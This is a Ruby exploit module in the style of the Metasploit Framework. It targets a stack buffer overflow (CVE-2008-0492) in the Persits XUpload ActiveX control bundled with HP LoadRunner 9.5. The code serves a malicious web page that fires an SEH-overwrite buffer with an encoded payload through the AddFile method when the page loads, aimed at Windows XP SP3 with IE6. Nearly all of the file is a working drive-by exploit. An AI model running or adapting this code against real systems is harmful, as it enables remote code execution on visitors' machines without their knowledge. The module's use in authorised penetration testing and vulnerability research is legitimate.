##
# $Id: hp_loadrunner_addfile.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Persits XUpload ActiveX AddFile Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Persits Software Inc's
				XUpload ActiveX control(version 3.0.0.3) thats included in HP LoadRunner 9.5.
				By passing an overly long string to the AddFile method, an attacker may be
				able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'jduck' ],
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2008-0492'],
					[ 'OSVDB', '40762'],
					[ 'BID', '27456' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/4987' ],
					[ 'URL', 'http://lists.grok.org.uk/pipermail/full-disclosure/2007-December/059296.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'XUpload.ocx 3.0.0.3 on Windows XP SP3 / IE6 SP3',
						{
							'Ret' => 0x10019d6e # pop/pop/ret @ XUpload.ocx
						}
					],
				],
			'DisclosureDate' => 'Jan 25 2008',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	= rand_text_alpha(rand(100) + 1)
		strname	= rand_text_alpha(rand(100) + 1)

		# Set the exploit buffer
		sploit = rand_text_alpha(738)
		sploit << generate_seh_payload(target.ret)
		sploit << p.encoded
		sploit << rand_text(1000) * 25
		sploit = Rex::Text.to_unescape(sploit)

		# Build out the message
		content = %Q|<html>
<script language='javascript'>
function check()
{
#{strname} = new String(unescape("#{sploit}"));
#{vname}.AddFile(#{strname});
}
</script>
<body onload='javascript:check()'>
<object classid='clsid:E87F6C8E-16C0-11D3-BEF7-009027438003' id='#{vname}'></object>
</body>
</html>
|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
